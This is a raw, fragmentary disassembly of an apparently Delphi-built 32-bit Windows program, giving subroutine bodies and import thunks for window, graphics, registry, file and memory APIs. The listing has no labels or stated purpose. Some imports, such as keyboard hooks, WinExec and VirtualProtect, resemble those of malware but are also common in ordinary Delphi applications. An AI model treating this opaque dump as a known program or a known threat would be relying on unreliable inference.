cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404db4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404fda
retn
sub_404fdc
mov al 0x11
jmp sub_402848
sub_405007
retn
sub_405248
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404ee8
pop ebp
retn 0x4
j_sub_404bb4
jmp sub_404bb4
sub_40525d
retn
sub_405260
call sub_405400
retn
sub_405464
test eax eax
je r-xdata
retn
[ eax - 0x8 ]
sub_405498
call sub_405470
retn
sub_4057e1
jmp sub_403a98
sub_40594c
call sub_40595c
retn
sub_405954
call sub_40597c
retn
sub_40595c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405a17
jmp sub_4037e4
sub_405a38
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405aac
jmp sub_403a98
sub_405ab3
pop ecx
pop ebp
retn
sub_405b2c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405b38
add eax 0x4
push eax
call sub_401324
retn
sub_405b44
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402848
sub_405b54
call sub_4032b4
mov [ eax + 0x4 ] 0x1
retn
sub_405b8c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40131c
pop ebp
retn 0x4
sub_405e7b
jmp sub_403a98
sub_405e82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f1f
jmp sub_403a98
sub_405f26
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f6f
jmp sub_403a98
sub_405f76
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40603a
jmp sub_403a98
sub_406041
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_406092
jmp sub_403a98
sub_406099
pop ebp
retn
sub_406170
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_406190
push eax
push 0x40
call LocalAlloc
retn
sub_40619c
mov eax 0x10
retn
sub_406228
mov eax rw-data
call sub_405a38
retn
sub_40629d
jmp sub_403a98
sub_4062a4
pop ebp
retn
sub_4062a8
sub [ rw-data ] 0x1
retn
sub_4062b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4062cc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4062d4
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_406359
jmp sub_403a98
sub_406360
pop ebp
retn
sub_406364
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
DeleteFileA
jmp [ __import_lookup_table_6(kernel32:DeleteFileA) ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetTimeZoneInformation
jmp [ __import_lookup_table_6(kernel32:GetTimeZoneInformation) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ __import_lookup_table_6(kernel32:ResumeThread) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406678
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
ScaleViewportExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleViewportExtEx) ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ChildWindowFromPoint
jmp [ ChildWindowFromPoint@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406dec
shr eax 0x10
retn
sub_406df0
call GetTickCount
retn
sub_406df8
xchg edx eax
call sub_4028e8
retn
sub_406e00
xor eax eax
retn
sub_406e04
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406e14
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406e30
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406e44
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406e7c
call sub_406de0
retn
sub_406e84
call sub_406de0
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_407061
jmp sub_403a98
sub_407068
pop ebp
retn
sub_40706c
sub [ rw-data ] 0x1
retn
sub_407099
jmp sub_403a98
sub_4070a0
pop ebp
retn
sub_4070a4
sub [ rw-data ] 0x1
retn
sub_4073c9
jmp sub_403a98
sub_4073d4
sub [ rw-data ] 0x1
retn
sub_407ea1
add eax 0xffffffd4
jmp sub_40d7ac
sub_407ea9
add eax 0xffffffd4
jmp sub_40d654
sub_407eb1
add eax 0xffffffd4
jmp sub_40d6f0
sub_407ec3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405b8c
sub_407ecd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ba0
sub_407fa4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
pop ebx
retn
sub_40844d
jmp sub_403a98
sub_408454
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40890c
call sub_4088e8
retn
sub_4089a4
push eax
call CloseHandle
retn
sub_408a14
push ebx
mov ebx eax
mov eax ebx
call sub_4089ac
inc eax
setne al
pop ebx
retn
sub_408a24
push ebx
mov ebx eax
mov eax ebx
call sub_4045d8
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_408bbc
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408bd0
push esi
mov esi eax
xchg edx eax
call sub_4028e8
mov eax esi
pop esi
retn
sub_408d90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404310
pop esi
pop ebx
retn
sub_408da4
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026ec
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408db8
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408df0
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_40270c
sub_408e58
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402848
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408e7c
push ebx
mov ebx eax
mov eax ebx
call sub_404118
pop ebx
retn
sub_4091df
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404118
pop eax
pop ebx
retn
sub_409497
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4095f2
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40994f
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40994f
sub_409a0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045d8
mov edx esi
xor ecx ecx
call sub_409898
pop esi
pop ebx
retn
sub_409a80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045d8
mov edx esi
mov cl 0x1
call sub_409898
pop esi
pop ebx
retn
sub_40a2f2
jmp sub_403a98
sub_40a2f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a3ea
jmp sub_403a98
sub_40a3f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ab95
jmp sub_403a98
sub_40ab9c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ac3c
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40abc8
pop ebp
retn 0x8
sub_40ac50
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xchg edx eax
call sub_40abc8
pop ebp
retn 0x8
sub_40ad95
jmp sub_403a98
sub_40ad9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b23f
jmp sub_403a98
sub_40b246
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b793
jmp sub_403a98
sub_40b79a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b845
jmp sub_403a98
sub_40b84c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b8ef
jmp sub_403a98
sub_40b8f6
pop esi
pop ecx
pop ebp
retn
sub_40bad2
jmp sub_403a98
sub_40bad9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb30
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40be22
jmp sub_403a98
sub_40bef0
jmp sub_403a98
sub_40bf18
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4032d0
sub_40c014
pop ebx
retn
sub_40c0b4
jmp sub_403a98
sub_40c0bb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0c4
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403ad0
sub_40c0d1
retn
sub_40c0d4
push ebp
mov ebp esp
call sub_40c018
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40c0c4
pop ebp
retn 0x4
sub_40c0f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
retn
sub_40c188
push ebx
mov ebx eax
mov eax ebx
call sub_40c108
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c35b
jmp sub_403a98
sub_40c362
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c427
jmp sub_403a98
sub_40c42e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c438
call sub_40bcc4
mov eax 0x1
call sub_40407c
sub_40c5bc
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c695
jmp sub_403a98
sub_40c6b2
jmp sub_403a98
sub_40c6b9
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c764
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c6c8
mov ecx eax
sub_40c950
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c970
push eax
call CharNextA
retn
sub_40cc08
jmp sub_403a98
sub_40cc0f
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cc78
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40d0cf
jmp sub_403a98
sub_40d0d6
pop ebx
mov esp ebp
pop ebp
retn
sub_40d29f
jmp sub_403a98
sub_40d2a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40d348
jmp sub_403a98
sub_40d34f
pop ebx
mov esp ebp
pop ebp
retn
sub_40d354
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d2b8
sub_40d364
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d380
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_40270c
pop ebx
retn
sub_40d408
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d414
xchg [ eax ] edx
mov eax edx
retn
sub_40d474
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d504
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d61c
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d644
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d8bf
jmp sub_403a98
sub_40d8c6
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d934
jmp sub_403a98
sub_40d93b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d959
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d952
jmp sub_403a98
sub_40d959
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40dda9
jmp sub_403a98
sub_40ddb0
pop ebp
retn
sub_40de1c
jmp sub_403a98
sub_40de23
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40de9c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40df02
jmp sub_403a98
sub_40df09
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40df6e
jmp sub_403a98
sub_40df75
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dfda
jmp sub_403a98
sub_40dfe1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e046
jmp sub_403a98
sub_40e04d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e0b2
jmp sub_403a98
sub_40e0b9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e131
jmp sub_403a98
sub_40e138
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40e1a4
jmp sub_403a98
sub_40e1ab
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e214
jmp sub_403a98
sub_40e21b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e288
jmp sub_403a98
sub_40e28f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40e615
jmp sub_403a98
sub_40e61c
pop ebp
retn
sub_40e620
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e2e4
sub_40e631
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40ecba
jmp sub_403a98
sub_40ecc1
pop ecx
pop ebp
retn
sub_40ed53
jmp sub_403a98
sub_40ed5a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40edaa
jmp sub_403a98
sub_40edb1
pop ecx
pop ebp
retn
sub_40edfe
jmp sub_403a98
sub_40ee05
pop ecx
pop ebp
retn
sub_40ee97
jmp sub_403a98
sub_40ee9e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eeee
jmp sub_403a98
sub_40eef5
pop ecx
pop ebp
retn
sub_40f13d
jmp sub_403a98
sub_40f144
pop ebx
mov esp ebp
pop ebp
retn
sub_40f25a
jmp sub_403a98
sub_40f261
pop ecx
pop ebp
retn
sub_40f264
push ebx
mov ebx eax
mov eax ebx
call sub_40f4fc
mov [ ebx ] 0x1
pop ebx
retn
sub_40f510
push eax
